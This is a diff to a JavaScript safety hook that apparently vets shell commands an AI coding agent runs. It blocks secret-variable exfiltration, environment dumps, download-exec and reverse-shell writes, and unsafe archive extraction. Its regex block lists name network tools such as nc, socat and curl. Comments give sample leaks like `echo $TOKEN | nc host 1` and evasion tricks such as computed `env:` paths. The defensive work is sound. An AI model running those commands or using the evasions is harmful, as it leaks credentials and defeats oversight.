@@ -1821,34 +1821,93 @@ function tokenizedSensitiveRead(seg) {
   return null;
 }
 
-// A secret-shaped variable: a credential word anywhere, or a short one as a `_`-separated part.
-// (`AWS_REGION`, `AWS_PROFILE` are not secrets; `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `AWS_ACCESS_KEY_ID` match.)
-const secretVarName = (n) => /SECRET|TOKEN|PASSWORD|PASSWD|APIKEY|API_KEY|CREDENTIAL|PRIVATE/i.test(n) || n.split('_').some((p) => /^(?:KEY|PASS|AUTH|PAT)$/i.test(p));
-// `$X`, `${X}`, `${X:-..}`, PowerShell `$env:X` / `${env:X}`, and a bare `env:X` (`Get-Item env:X`).
-const VAR_REF = /\$\{?(?:env:)?([A-Za-z_]\w*)|(?<![\w$])env:\\?([A-Za-z_]\w*)/gi;
-const secretVarRef = (t) => [...t.matchAll(VAR_REF)].find((m) => secretVarName(m[1] || m[2]));
-// Text the shell does not expand: single-quoted strings and quoted-delimiter heredoc bodies.
-const unexpanded = (t) => t.replace(/<<-?\s*(['"])(\w+)\1[\s\S]*?\n\s*\2(?=\n|$)|'[^']*'/g, ' ');
+// A secret-shaped environment variable: an upper-case name with a credential word as a `_` part (`GH_TOKEN_2`,
+// `SECRET_KEY_BASE`, `DB_PASS`, `OPENAI_API_KEY_DEV`) or ending in KEY / AUTH / PASSWORD (`STRIPE_KEY`, `PGPASSWORD`).
+// Not a name for a key's type, file, path, id or size (`TOKEN_TYPE`, `KEY_FILE`, `MAX_TOKENS`, `NEXT_PAGE_TOKEN`),
+// `AWS_REGION`, `PWD`, or a lower-case shell variable (`$key`, `$token`).
+const SECRET_PART = /(?:^|_)(?:TOKENS?|SECRETS?|PASSWORD|PASSWD|PASS|API_?KEY|PRIVATE_KEY|CREDENTIALS?|PAT|KEY_BASE)(?:_|$)|_PWD(?:_|$)|_(?:KEY|AUTH)$|PASSW(?:OR)?D$/;
+const BENIGN_VAR = /_(?:TYPE|FILE|PATH|DIR|URL|NAME|ID|LENGTH|LIMIT)$|(?:^|_)(?:PAGE_TOKEN|MAX_TOKENS|TOKEN_COUNT)(?:_|$)/;
+// Run-together names (`GITHUBTOKEN`, `JWTSECRET`, `PRIVATEKEY`) count too; a name holding SECRET is never benign.
+const SECRET_WORD = /SECRET|TOKEN(?!IZ)|PASSW(?:OR)?D|APIKEY|CREDENTIAL|PRIVATE_?KEY/;
+const secretVarName = (n) => /^[A-Z][A-Z0-9_]*$/.test(n) && (n === 'AWS_ACCESS_KEY_ID' ||
+  ((SECRET_PART.test(n) || SECRET_WORD.test(n)) && (!BENIGN_VAR.test(n) || /SECRET/.test(n))));
+// `$X`, `${X}`, `${X:-..}`, PowerShell `$env:X` / `${env:X}` (any case: Windows names are), and a bare
+// `env:X` (`Get-Item env:X`). Not `${#X}` or `${X:+..}`, which print a length or a fixed word.
+const VAR_REF = /\$(\{)?(env:)?([A-Za-z_]\w*)(?!(?<=\{\w+):\+)|(?<![\w$])env:\\?([A-Za-z_]\w*)/gi;
+const secretVarRef = (t) => [...t.matchAll(VAR_REF)].find((m) => secretVarName(m[4] || m[2] ? (m[4] || m[3]).toUpperCase() : m[3]));
+// Text the shell expands: single-quoted spans outside double quotes, an escaped `\$` (PowerShell: backtick)
+// and quoted-delimiter heredoc bodies are dropped. The script of `sh -c '..'` / `eval '..'` is kept.
+function unexpanded(t) {
+  t = t.replace(/<<-?\s*(['"])(\w+)\1[\s\S]*?\n\s*\2(?=\n|$)/g, ' ');
+  const esc = isPoshTool ? '`' : '\\';
+  let out = '', dq = false;
+  for (let i = 0; i < t.length; i++) {
+    const c = t[i];
+    if (c === esc) { i++; out += ' '; continue; }
+    if (c === '"') dq = !dq;
+    else if (c === "'" && !dq) {
+      const e = t.indexOf("'", i + 1), end = e < 0 ? t.length : e;
+      if (/(?:(?:^|\s)-\w*c|\beval)\s+\$?$/.test(t.slice(Math.max(0, i - 64), i))) out += t.slice(i + 1, end);
+      out += ' '; i = end; continue;
+    }
+    out += c;
+  }
+  return out;
+}
+// The approve gate: a secret-shaped variable outside a test operand (`[ -n "$KEY" ]`, `test -z "$KEY"`
+// compare it, never print it), or a read of the whole environment.
+function secretInText(raw) {
+  // Only a quoted `-n` / `-z` operand of a test at command position: `[ $TOKEN -eq 1 ]` prints the value in
+  // its error, `echo do test $TOKEN` is an echo.
+  const t = unexpanded(raw).replace(/(?:^|[;&|(\n])[ \t]*(?:(?:if|then|elif|while|until|do|else|!|\{)[ \t]+)*(?:\[\[?|test)\s[^;&|\n]*/g,
+    (m) => /\$\(|`|>/.test(m) ? m : m.replace(/(^|\s)-[nz]\s+"\$\{?\w+\}?"/g, '$1'));
+  return !!secretVarRef(t);
+}
+const ENV_DUMP = /\bENVIRON\b|\$ENV\b|\benv\s*\(|\b[jy]q\b[^|;&]*(?<![.\w$-])(?<!--(?:arg|argjson|slurpfile|rawfile)\s+(?:\S+\s+)?)env\b/;
+// `Get-ChildItem Env:`, `gci env:G*`, `[Environment]::GetEnvironmentVariable(..)`, or a lister given a
+// computed path (`Get-ChildItem ('en'+'v:')`).
+const POSH_ENV_DUMP = /(?<![\w$])env:(?!\\?[A-Za-z_]\w*(?![\w*?[\]]))|GetEnvironmentVariable|\b(?:Get-ChildItem|gci|ls|dir|Get-Item|gi|Get-ItemProperty|gp)\s+(?:-\w+\s+)*(?:\(|\$(?!env:[A-Za-z_]\w*(?![\w*?[\]:])|_(?!\w)|PSItem\b|(?:HOME|PWD|PSScriptRoot)(?![\w:])))/i;
 const NET_PROG = /^(?:curl|wget|nc|ncat|netcat|socat|telnet|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)$/i;
-const WRAPPERS = /^(?:sudo|env|timeout|nohup|command|builtin|exec|time|nice|xargs)$/;
+const WRAPPERS = /^(?:sudo|doas|env|timeout|nohup|command|builtin|exec|time|nice|xargs|stdbuf|strace|watch|&)$/;
 // Header and credential values: how a token is meant to be sent (`-H "x-api-key: $KEY"`, `-su me:$TOKEN`,
-// `iwr -Headers @{..}`). They fall through to the host prompt (approve never takes a network command
-// with a variable); every other argument (URL, body, `-F`, `-A`) denies.
-const NET_AUTH_FLAG = /^(?:--(?:header|user|password|http-user|http-password|proxy-user|proxy-header)|-(?:Headers|Credential))$/i;
+// `--oauth2-bearer`, a cookie, `iwr -Headers @{..}`). They fall through to the host prompt (approve never
+// takes a network command with a variable); every other argument (URL, body, `-F`, `-A`) denies.
+const NET_AUTH_FLAG = /^(?:--(?:header|user|password|http-user|http-password|proxy-user|proxy-header|oauth2-bearer|cookie|key|cert|pass)|-(?:Headers|Credential|Token|Authentication))$/i;
+const CURL_SHORT_BOOL = '0123456aBfgGIijJklLMnNOpqRsSvVZ#';
+// A curl short cluster: the first letter that is not a boolean names the flag; its value is the rest of the
+// cluster or, at the end, the next word. 'next' / 'attached' for an auth flag (-H, -u, -b, -E), else null.
+function curlAuthCluster(f) {
+  if (!/^-[^-]/.test(f)) return null;
+  let i = 1;
+  while (i < f.length && CURL_SHORT_BOOL.includes(f[i])) i++;
+  if (i >= f.length || !'HubE'.includes(f[i])) return null;
+  return i === f.length - 1 ? 'next' : 'attached';
+}
 function secretVarToNet(v) {
   const stages = splitPipeStages(v);
-  for (let s = 0; s < stages.length; s++) {
-    const toks = stages[s].replace(/-Headers\s+@\{[^}]*\}/gi, ' ').match(/(?:'[^']*'|"[^"]*"|[^\s'"])+/g) || [];
+  const LEAK = 'Sending a secret environment variable to the network blocked -- possible exfiltration';
+  const net = (st) => {
+    const toks = st.replace(/-(?:Headers|Token|Credential)\s+(?:@\{[^}]*\}|\([^)]*\))/gi, ' ').match(/(?:'[^']*'|"[^"]*"|[^\s'"])+/g) || [];
     let k = 0;
     while (k < toks.length && (WRAPPERS.test(toks[k]) || /^-|^\d+[smhd]?$|^[A-Za-z_]\w*=/.test(toks[k]))) k++;
-    if (!NET_PROG.test(base(toks[k] || '').replace(/\.exe$/i, ''))) continue;
-    // `echo $TOKEN | nc host 1`, `printf %s "$KEY" | curl -d @- host`: a pipe feeds the network tool.
-    if (stages.slice(0, s).some((st) => secretVarRef(unexpanded(st)))) return 'Sending a secret environment variable to the network blocked -- possible exfiltration';
-    for (k++; k < toks.length; k++) {
+    const prog = base(toks[k] || '').replace(/^["']|["']$/g, '').replace(/\.exe$/i, '');
+    return NET_PROG.test(prog) ? { toks, k, curl: /^curl$/i.test(prog) } : null;
+  };
+  for (let s = 0; s < stages.length; s++) {
+    const n = net(stages[s]);
+    if (!n) continue;
+    // `echo $TOKEN | nc host 1`, `printf %s "$KEY" | curl -d @- host`: a pipe feeds the network tool. An
+    // upstream network call sends its own header; only what it prints flows on.
+    if (stages.slice(0, s).some((st) => !net(st) && secretVarRef(unexpanded(st)))) return LEAK;
+    const { toks, curl } = n;
+    for (let k = n.k + 1; k < toks.length; k++) {
       const t = toks[k], f = t.replace(/^"([\s\S]*)"$/, '$1');   // a variant may quote the whole word
-      if (NET_AUTH_FLAG.test(f) || /^-[A-Za-z]*[Hu]$/.test(f)) { k++; continue; }   // -H v, -su v
-      if (/^--(?:header|user|password|http-user|http-password|proxy-user)=|^-[A-Za-z]*[Hu]./.test(f)) continue;   // attached value
-      if (secretVarRef(unexpanded(t))) return 'Sending a secret environment variable to the network blocked -- possible exfiltration';
+      if (NET_AUTH_FLAG.test(f)) { k++; continue; }
+      if (/^--(?:header|user|password|http-user|http-password|proxy-user|proxy-header|oauth2-bearer|cookie|key|cert|pass)=/.test(f)) continue;
+      const cl = curl && curlAuthCluster(f);
+      if (cl === 'next') { k++; continue; }
+      if (cl === 'attached') continue;
+      if (secretVarRef(unexpanded(t))) return LEAK;
     }
   }
   return null;
@@ -2303,7 +2362,8 @@ const APPROVE_PATTERNS = [
   // so their executed sub-command is inspected (else `find -exec node x` launders in).
   /^\s*(cd|ls|pwd|which|whoami|date|uname|file|stat|wc|id|groups|echo|cat|head|tail|realpath|basename|dirname|test|true|false|mkdir|touch|cp|mv|ln|sort|uniq|tr|cut|paste|tee|diff|comm|seq|printf|tput|clear|tree|less|more|column|expand|fmt|fold|join|nl|od|rev|shuf|split|tac|tsort|yes|grep|rg|awk|sed|jq|yq|fd|bat|delta|hexdump|xxd|md5sum|sha1sum|sha256sum|sha512sum|cksum|crc32)\b/,
   // Read-only system inspection
-  /^\s*(ss|ps(?![^|;&]*\s(?:[A-Za-z]*e[A-Za-z]*|-[A-Za-z]*E[A-Za-z]*)(?=\s|$))|netstat|lsof|df|du|free|uptime|top|htop|vmstat|iostat|nproc|hostname|ifconfig|ip\s+(addr|route|link|-s|-br)|ping|dig|nslookup|traceroute|locale|timedatectl|journalctl|systemctl\s+(status|list-units|list-unit-files|cat|show)|dmesg|lscpu|lsblk|lspci|lsusb|mount|findmnt|pgrep|pidof)\b/,
+  // ps: a BSD `e` cluster (first argument) or `-E` prints each process's environment.
+  /^\s*(ss|ps(?![^|;&]*\s['"]?[auxwjlmrsvcfhSTe]*e[auxwjlmrsvcfhSTe]*['"]?(?=\s|$))(?![^|;&]*\s-[A-Za-z]*E[A-Za-z]*(?=\s|$))|netstat|lsof|df|du|free|uptime|top|htop|vmstat|iostat|nproc|hostname|ifconfig|ip\s+(addr|route|link|-s|-br)|ping|dig|nslookup|traceroute|locale|timedatectl|journalctl|systemctl\s+(status|list-units|list-unit-files|cat|show)|dmesg|lscpu|lsblk|lspci|lsusb|mount|findmnt|pgrep|pidof)\b/,
   // HTTP requests (deny rules cover dangerous flags)
   /^\s*(curl|wget)\b/,
   // Version checks
@@ -2336,11 +2396,12 @@ const APPROVE_PATTERNS = [
   // JavaScript / TypeScript tooling
   /^\s*(tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint|tsx|ts-node|swc)\b/,
   /^\s*(npx|pnpm|yarn|bun)\s+(?:--prefix\s+\S+\s+|-[A-Za-z]+\s+)*(tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint|playwright\s+test)\b/,
-  /^\s*npm\s+(?:view|ls|outdated|config\s+(?:get|list))\b/,
+  // `npm config get //registry/:_authToken` prints the token.
+  /^\s*npm\s+(?:view|ls|outdated|config\s+(?:get(?![^|;&]*(?:auth|token|passw|_pass|cert|key))|list))\b/i,
   /^\s*node\s+--check\s+[^-\s]\S*\s*$/,
   // `gh api` read: no method override and no body/field flag anywhere in the segment.
   /^\s*gh\s+api(?![^|;&]*\s(?:-X|--method|-f|-F|--field|--raw-field|--input)\b)\s/,
-  /^\s*pnpm\s+(?:(?:--dir|-C|--filter|-F|--prefix)[=\s]\s*\S+\s+|-[A-Za-z-]+\s+)*(?:run|test|build|dev|lint|format|exec|start|typecheck|[\w-]+:[\w:-]+|config\s+(?:get|list)|why|ls|list|outdated|peers\s+check)(?=\s|$)/,
+  /^\s*pnpm\s+(?:(?:--dir|-C|--filter|-F|--prefix)[=\s]\s*\S+\s+|-[A-Za-z-]+\s+)*(?:run|test|build|dev|lint|format|exec|start|typecheck|[\w-]+:[\w:-]+|config\s+(?:get(?![^|;&]*(?:auth|token|passw|_pass|cert|key))|list)|why|ls|list|outdated|peers\s+check)(?=\s|$)/,
   // `pnpm install` with flags only (no package argument): same trust as `npm ci`.
   /^\s*pnpm\s+(?:(?:--dir|-C|--filter|-F|--prefix)[=\s]\s*\S+\s+|-[A-Za-z-]+\s+)*(?:install|i)(?:\s+(?:-[\w-]+(?:=\S+)?|\d*>>?\s*&?\S+))*\s*$/,
   /^\s*bun\s+(?:-[A-Za-z]+\s+)*(run|test|build|dev|x\s+(?:tsc|eslint|prettier|vitest|jest|mocha|biome|stylelint)|start)\b/,
@@ -2464,6 +2525,15 @@ function isSafeRelativePath(p) {
 // and removed, so the raw passes do not read inert prose as commands. It never approves: the whole
 // command, with the body gone, then takes the normal route. Returns the text without the body, or null.
 let routedTarget = null;   // the instruction file whose body was just scanned clean
+let routedBody = null;     // { target, body }: the removed body, for the write tracking of the approve walk
+// Written shell content with a HIGH finding (secret upload, reverse shell, download-exec). Text in a README, a
+// Dockerfile or a setup script is normal; it denies when the same command then runs something
+// (highWriteRuns), or when the file defines commands (scan-content cmdDefHigh: any HIGH but a known installer).
+const highWrites = [];
+function noteHighWrite(target, body) {
+  if (CMD_DEF.test(target) && scan.cmdDefHigh(target, body)) deny('Writing a secret upload, reverse shell or download-exec to a file that defines commands blocked', target);
+  if (scan.hasHigh(scan.scanShell(body))) highWrites.push(target);
+}
 function routedHeredoc(raw) {
   if (!raw.includes('<<')) return null;
   const ast = parseBash(raw);
@@ -2482,13 +2552,14 @@ function routedHeredoc(raw) {
   const inj = scan.scanInjection(h.body, { decode: true });
   const hi = inj.find((x) => x.severity === 'high');
   if (hi) deny('Prompt injection in heredoc-written content: ' + hi.signal, h.body);
-  if (scan.hasHigh(scan.scanShell(h.body))) deny('Writing a secret upload or download-exec command to a file blocked', target);
+  noteHighWrite(target, h.body);
   if (scan.isAgentInstructionFile(target)) {
     const med = inj.find((x) => x.severity === 'medium' && x.category === 'injection');
     if (med) deny('Prompt injection in heredoc-written agent-instruction file: ' + med.signal, h.body);
     if (inj.some((x) => x.signal === 'instruction-override-quoted')) ask('Quoted instruction-override phrase in a heredoc-written agent-instruction file', h.body);
     routedTarget = target;
   }
+  routedBody = { target, body: h.body };
   return src.slice(0, h.s) + src.slice(h.t);
 }
 const instructionTarget = (t) => scan.isAgentInstructionFile(t) && t !== routedTarget;
@@ -3197,6 +3268,8 @@ function checkPoshApprove(seg, depth, idx) {
     if (/^(?:Get-Content|gc|cat|type|Select-String|sls|Format-Hex|Import-Csv|Import-Clixml)$/i.test(name) && /(?:^|\s)\$?\(\)/.test(st)) return false;
     const body = sc.stagesBlank[k].replace(/\.\s*([A-Za-z_]\w*)\s*\(\)/g, (m0, name) => (POSH_SAFE_METHOD.test(name) ? '' : m0));
     if (/\.\s*[A-Za-z_]\w*\s*\(\)/.test(body)) return false;   // `(cmd).M()`, `$v.M()`: unknown method
+    const ws = st.trim().split(/\s+/).filter((t) => t !== '&').map((t) => ({ text: t.replace(/^['"]+|['"]+$/g, ''), lit: true }));
+    if (ws.length && runnerDefHigh(ws, projectDir)) return false;   // npm test / make / pytest run the on-disk scripts
     if (!POSH_APPROVE_PATTERNS.some((p) => p.test(st))) return false;
   }
   return true;
@@ -3997,9 +4070,11 @@ function walk(l, vals, cb, conditional) {
         }
         if (lits && der && lits.length) lits.push('_derived_');
         if (lits && lits.length <= VALS_MAX) v.set(st.name, lits); else v.delete(st.name);
+        // The glob patterns a loop variable ranges over, for `cd "$d"` (`for d in packages/*`).
+        if (lits && der) v.set(' glob:' + st.name, (st.words || []).filter((w) => w.glob).map((w) => w.text)); else v.delete(' glob:' + st.name);
         if (envTaints(st.name)) v.set(' taint', [...(v.get(' taint') || []), { name: st.name, raw: (st.words || []).map((w) => w.text).join(' ') || '$', persisted: true }]);
         if (!walkMaybe(st.body, v, cb)) return false;
-        v.delete(st.name);
+        v.delete(st.name); v.delete(' glob:' + st.name);
       }
     }
   }
@@ -4066,8 +4141,9 @@ const PLAIN_READER = /^(?:ls|cat|head|tail|grep|rg|stat|wc|diff|file|find|test|\
 // redirects to an unread target after it do not approve.
 let cdProtected = false, claudeNamed = false, approving = false;
 // The project is the hook's cwd. cdDir: where a `cd` in this command went (null: unknown); wroteCode: an
-// earlier stage wrote a file a runner can load (a manifest, a test, source).
-let projectDir = process.cwd(), cdDir = projectDir, wroteCode = false;
+// earlier stage wrote a file a runner can load (a manifest, a test, source); downloaded / unpacked: an earlier
+// stage fetched a file or unpacked an archive (which can hold `.git/config`, `.git/hooks`, `.claude/settings.json`).
+let projectDir = process.cwd(), cdDir = projectDir, wroteCode = false, downloaded = false, unpacked = false;
 // `~`, and on Windows a Git Bash `/c/x` path, as a host path.
 function hostPath(p, from) {
   let t = p.replace(/^~(?=[\\/]|$)/, safeHomedir());
@@ -4077,18 +4153,52 @@ function hostPath(p, from) {
 const inside = (dir, abs) => { const r = path.relative(dir, abs); return !r.startsWith('..') && !path.isAbsolute(r); };
 // Where downloaded or unpacked code lands: a temp dir or Downloads. The user's other checkouts are not
 // in it (agents run tests across sibling repositories from a parent folder).
-const untrustedDir = (abs) => !inside(projectDir, abs) && [os.tmpdir(), '/tmp', '/var/tmp', path.join(safeHomedir(), 'Downloads')].some((d) => inside(hostPath(d, projectDir), abs));
-// Files whose content is a command a runner runs (scripts, recipes, build scripts, plugin hooks).
-const CMD_DEF = /(?:^|[\\/])(?:package\.json|[Mm]akefile|GNUmakefile|[^\\/]*\.mk|build\.rs|conftest\.py|setup\.py|setup\.cfg|pyproject\.toml|tox\.ini|pytest\.ini|noxfile\.py|\.npmrc|\.yarnrc(?:\.yml)?|Cargo\.toml|config\.toml|Rakefile|[Jj]ustfile|Taskfile\.ya?ml)$/;
+const untrustedDir = (abs) => !inside(projectDir, abs) && [os.tmpdir(), '/tmp', '/var/tmp', '/dev/shm', '/run/user', path.join(safeHomedir(), 'Downloads')].some((d) => inside(hostPath(d, projectDir), abs));
+// Files whose content is a command a runner runs (scripts, recipes, build scripts, plugin hooks). Any case:
+// Windows and macOS file systems are case-insensitive (`PACKAGE.JSON` is package.json).
+const CMD_DEF = /(?:^|[\\/])(?:package\.json|makefile|GNUmakefile|[^\\/]*\.mk|build\.rs|conftest\.py|setup\.py|setup\.cfg|pyproject\.toml|tox\.ini|pytest\.ini|noxfile\.py|\.npmrc|\.yarnrc(?:\.yml)?|Cargo\.toml|config\.toml|Rakefile|justfile|Taskfile\.ya?ml|composer\.json|deno\.jsonc?|\.husky[\\/][^\\/]+)$/i;
+// Files a runner loads as code: source, a tool config (`jest.config.js`, `.eslintrc.js`), Python's startup hooks.
+const CODE_FILE = /\.(?:[cm]?[jt]sx?|py|rb|go|rs|sh|bash|php|pl|lua|java|kts?)$|(?:^|[\\/])[^\\/]*\.config\.[^\\/]+$|(?:^|[\\/])\.[^\\/]*rc(?:\.[^\\/]+)?$/i;
+// A write whose content comes from outside the project: a download, a decoder, or a file named outside it.
+function foreignWrite(st, ts, vals) {
+  if (!st || st.type !== 'simple') return true;
+  if (/^(?:curl|wget|base64|base32|xxd|openssl|gpg|uudecode)$/.test(stageProgram(st.words))) return true;
+  return st.words.slice(1).some((w) => {
+    if (w.text.startsWith('-')) return false;
+    const xs = w.lit ? [w.text] : subst(w.text, vals);
+    return !xs || !xs.length || xs.some((x) => !ts.includes(x) && (x.includes('$') || (/^(?:[~\\/]|[A-Za-z]:)/.test(x) && !inside(projectDir, hostPath(x, projectDir)))));
+  });
+}
+// The commands a literal Makefile or package.json defines: each must approve on its own (`all:\n\t@npm publish`,
+// `node -e ..` do not). A Makefile line outside a recipe is a rule, a comment or a plain assignment: no
+// `$(shell ..)`, `!=`, `include`, `SHELL :=` or `\` continuation.
+const MAKE_LINE = /^(?:\s*(?:#.*)?|[\w.%\/ -]+:[\w.%\/ -]*|(?!(?:SHELL|\.SHELLFLAGS|MAKEFLAGS)\b)[A-Za-z_]\w*\s*[:?+]?=[^$`\\]*)$/;
+function definedCommandsOk(target, body, vals, depth) {
+  const b = base(target).toLowerCase();
+  let cmds;
+  if (b === 'package.json') {
+    try { const s = JSON.parse(body).scripts || {}; cmds = Object.values(s); } catch (_) { return false; }
+  } else if (/^(?:gnu)?makefile$|\.mk$/.test(b)) {
+    const ls = body.replace(/\r/g, '').split('\n');
+    if (ls.some((l) => /\\$/.test(l) || (!l.startsWith('\t') && !MAKE_LINE.test(l)))) return false;
+    cmds = ls.filter((l) => l.startsWith('\t')).map((l) => l.slice(1).replace(/^[@+-]+/, ''));
+  } else return true;
+  return cmds.every((c) => typeof c === 'string' && approveText(c, vals, depth + 1));
+}
 const BIN_DIR = /(?:^|[\\/])(?:node_modules[\\/]\.bin|\.?venv[\\/](?:bin|Scripts))[\\/]/;
+// printf and `echo -e` escapes (`\x63`, `\143`, `c`): what the file holds, for the content scan.
+const unescapeC = (s) => s.replace(/\\(?:x([0-9A-Fa-f]{1,2})|u([0-9A-Fa-f]{1,4})|U([0-9A-Fa-f]{1,8})|0?([0-7]{1,3})|([\s\S]))/g, (m, x, u, U, o, c) =>
+  x ? String.fromCharCode(parseInt(x, 16)) : u || U ? String.fromCodePoint(Math.min(parseInt(u || U, 16), 0x10ffff)) : o ? String.fromCharCode(parseInt(o, 8) & 255)
+    : { n: '\n', t: '\t', r: '\r', a: '\x07', b: '\b', f: '\f', v: '\v', e: '\x1b', '\\': '\\' }[c] ?? m);
 // The literal content a stage writes, or null when this hook cannot read it: a heredoc body without
 // expansions, `echo`/`printf` of literal words, the script of a literal `sed -i`.
 function writtenContent(st) {
   const hd = (st.redirs || []).find((r) => r.heredoc);
+  if (hd && hd.heredoc.body === '' && routedBody && [...st.words, ...st.redirs.map((r) => r.target)].some((w) => w && w.text === routedBody.target)) return routedBody.body;
   if (hd) return hd.heredoc.quoted || !/[$`]/.test(hd.heredoc.body) ? hd.heredoc.body : null;
   const prog = stageProgram(st.words);
   if (!st.words.every((w) => w.lit)) return null;
-  if (/^(?:echo|printf)$/.test(prog)) return st.words.slice(1).map((w) => w.text).join(' ').replace(/\\n/g, '\n').replace(/\\t/g, '\t');
+  if (/^(?:echo|printf)$/.test(prog)) return unescapeC(st.words.slice(1).map((w) => w.text).join(' '));
   if (prog === 'sed' && st.words.some((w) => /^-[A-Za-z]*i|^--in-place/.test(w.text))) return st.words.slice(1).map((w) => w.text).join(' ');
   return null;
 }
@@ -4103,7 +4213,7 @@ function stageProgram(words) {
 const isRunner = (prog) => RUNNER.test(prog) || RUNNER_MORE.test(prog);
 // Flags whose value is a program to run or a module to load, per tool word present: never approved.
 const RUN_PROGRAM_FLAGS = [
-  [/^(?:npm|pnpm|yarn|bun|npx)$/, /^--script-shell(?:=|$)/],
+  [/^(?:npm|pnpm|yarn|bun|npx)$/, /^--(?:script-shell|node-options)(?:=|$)/],
   [/^go$/, /^--?(?:exec|toolexec|overlay)(?:=|$)/],
   [/^cargo$/, /^--config(?:=|$)/],
   [/^pytest$/, /^-p(?!\s*no:)|^-o|^--override-ini(?:=|$)/],
@@ -4116,9 +4226,11 @@ const RUN_PROGRAM_FLAGS = [
 // in a temp dir or Downloads.
 const RUN_PATH_FLAGS = [
   [/^pytest$/, /^-c|^--(?:rootdir|confcutdir|config-file)(?:=|$)/],
-  [/^eslint$/, /^-c|^--config(?:=|$)/],
+  [/^eslint$/, /^-[cf]|^--(?:config|format)(?:=|$)/],
   [/^prettier$/, /^--config(?:=|$)/],
-  [/^(?:vitest|jest|mocha|playwright)$/, /^-c|^--(?:config|setupFiles\w*|globalSetup|globalTeardown|root|dir)(?:=|$)/],
+  [/^(?:vitest|jest|mocha|playwright)$/, /^-c|^--(?:config|setupFiles\w*|globalSetup|globalTeardown|root|rootDir|dir|runner|reporters?|testSequencer|projects)(?:=|$)/],
+  [/^bun$/, /^--preload(?:=|$)/],
+  [/^pre-commit$/, /^-c|^--config(?:=|$)/],
   [/^make$/, /^-[fI]|^--(?:file|makefile|include-dir)(?:=|$)/],
   [/./, /^(?:-C|--prefix|--dir|--cwd|--manifest-path|--directory|--git-dir|--work-tree)(?:=|$)/],
 ];
@@ -4140,9 +4252,72 @@ function runnerUnsafe(words) {
     const v = eq > 0 ? { text: toks[k].slice(eq + 1), lit: words[k].lit } : /^-[A-Za-z]./.test(toks[k]) ? { text: toks[k].slice(2), lit: words[k].lit } : words[k + 1];
     if (DIR_FLAG.test(toks[k])) dirSet = true;
     if (!v || !v.lit || v.text === '_derived_' || (cdDir === null && !/^(?:[~\\/]|[A-Za-z]:)/.test(v.text))) { if (git) continue; return true; }
-    if (untrustedDir(hostPath(v.text, cdDir || projectDir))) return true;
+    if (/^\s*[{[]/.test(v.text) || untrustedDir(hostPath(v.text, cdDir || projectDir))) return true;   // inline JSON config
+  }
+  // Any argument naming a temp dir or Downloads: a test path (`pytest /tmp/x`, conftest.py loads), a flag value
+  // (`-vettool=/tmp/x`, `-javaagent:/tmp/x.jar`, `--reporter /tmp/x.js`).
+  const OUT_FLAG = /^-[^=:]*(?:out|junit|report(?!er)|basetemp|cov|log|cache|te?mp|dest)/i;   // an output path
+  for (const [k, w] of git ? [] : words.entries()) {
+    if (!k || !w.lit || OUT_FLAG.test(w.text) || OUT_FLAG.test(words[k - 1].text)) continue;
+    for (const p of [w.text, w.text.replace(/^-[^=:]*[=:]/, '')]) if (/^(?:[~\\/]|[A-Za-z]:)/.test(p) && untrustedDir(hostPath(p, projectDir))) return true;
   }
   return !dirSet && (cdDir === null ? !git : untrustedDir(cdDir));
+}
+// The command-definition file a runner reads from disk in its effective dir (package.json scripts, a Makefile,
+// build.rs, conftest.py): a HIGH shell finding there (curl | sh, a reverse shell) is not approved. Absent: nothing
+// runs from it. Unreadable or over 64 KB: not approved.
+const RUNNER_DEFS = [[/^(?:npm|pnpm|yarn|bun)$/, ['package.json']], [/^make$/, ['GNUmakefile', 'makefile', 'Makefile']],
+  [/^cargo$/, ['build.rs']], [/^pytest$/, ['conftest.py']]];
+function runnerDefHigh(words, baseDir) {
+  const prog = stageProgram(words), def = RUNNER_DEFS.find(([re]) => re.test(prog));
+  if (!def) return false;
+  const toks = words.map((w) => w.text);
+  let dir = baseDir || cdDir || projectDir;
+  const extra = [];
+  for (let k = 1; k < toks.length; k++) {
+    const m = /^(-C|-f|--prefix|--dir|--cwd|--directory|--file|--makefile|--manifest-path)(?:=(.*))?$/.exec(toks[k]) || /^(-[Cf])(.+)$/.exec(toks[k]);
+    const v = m && (m[2] !== undefined ? m[2] : toks[k + 1]);
+    if (!v) continue;
+    if (prog === 'make' && /^(?:-f|--file|--makefile)$/.test(m[1])) extra.push(hostPath(v, dir));
+    else if (m[1] === '--manifest-path') dir = path.dirname(hostPath(v, dir));
+    else if (m[1] !== '-f') dir = hostPath(v, dir);
+  }
+  return [...def[1].map((f) => path.join(dir, f)), ...extra].some((f) => {
+    let text;
+    try {
+      const st = fs.statSync(f);
+      if (!st.isFile() || st.size > 65536) return true;   // a FIFO or device would block the read
+      text = fs.readFileSync(f, 'utf8');
+    } catch (e) { return e.code !== 'ENOENT' && e.code !== 'ENOTDIR'; }
+    if (base(f) === 'package.json') {
+      try { text += '\n' + Object.values(JSON.parse(text).scripts || {}).map(String).join('\n'); } catch (_) { /* scanned as is */ }
+    }
+    return scan.hasHigh(scan.scanShell(text));
+  });
+}
+// An extract never lands in `.git` or `.claude` (hooks, config, settings run code); after a download in the
+// same command it needs an explicit subdirectory, not the project root.
+function isExtract(words) {
+  const toks = words.map((w) => w.text);
+  return base(toks[0]) === 'unzip' ? !toks.some((t) => /^-[A-Za-z]*[ltvZ]/.test(t))
+    : toks.some((t, k) => /^--(?:extract|get)$/.test(t) || (/^-?[A-Za-z]*x/.test(t) && (k === 1 || t[0] === '-')));
+}
+function unpackSafe(words) {
+  const toks = words.map((w) => w.text), zip = base(toks[0]) === 'unzip';
+  if (!isExtract(words)) return true;
+  let dest = null;
+  for (let k = 1; k < toks.length; k++) {
+    const t = toks[k];
+    if (zip ? t === '-d' : /^(?:-C|--directory)$/.test(t)) dest = words[k + 1] || { text: '', lit: false };
+    else if (!zip && /^--directory=/.test(t)) dest = { text: t.slice(12), lit: words[k].lit };
+    else if (zip ? /^-d./.test(t) : /^-C./.test(t)) dest = { text: t.slice(2), lit: words[k].lit };
+  }
+  if (dest && !dest.lit) return !downloaded;
+  if (!dest && cdDir === null) return false;   // `cd "$(git rev-parse --git-dir)" && tar xf x`: lands somewhere unknown
+  const where = dest ? hostPath(dest.text, cdDir || projectDir) : cdDir;
+  if (where && /(?:^|[\\/])\.(?:git|claude)(?:[\\/]|$)/i.test(path.relative(projectDir, where) || '.')) return false;
